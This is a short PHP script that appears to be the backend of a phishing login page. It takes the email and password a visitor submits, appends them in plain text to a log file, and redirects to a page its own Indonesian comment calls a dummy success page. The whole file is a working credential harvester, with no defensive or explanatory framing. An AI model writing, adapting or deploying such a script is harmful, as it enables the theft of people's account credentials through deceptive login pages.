<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $log = fopen("log.txt", "a");
    fwrite($log, "Email: $email | Password: $password\n");
    fclose($log);

    // Redirect ke halaman sukses (dummy)
    header("Location: success.html");
    exit();
}
?>
